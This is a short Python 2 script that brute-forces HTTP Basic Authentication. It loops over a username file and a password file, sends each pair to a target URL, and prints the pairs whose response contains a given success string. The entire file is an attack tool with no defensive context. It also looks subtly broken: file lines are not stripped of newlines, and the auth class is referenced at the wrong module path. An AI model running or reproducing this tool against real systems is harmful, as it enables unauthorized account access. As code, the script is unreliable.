import requests
import sys

if len(sys.argv) != 5:
    print 'USAGE: brute_http_basic.py url userfile passfile success'
    sys.exit()

url = sys.argv[1]
userfile = sys.argv[2]
passfile = sys.argv[3]
success = sys.argv[4]

for pwd in open(passfile):
    for user in open(userfile):
        resp = requests.get(url, auth=requests.HTTPBasicAuth(user, pwd))
        if success in resp.text:
            print 'Success: {0}/{1}'.format(user, pwd)
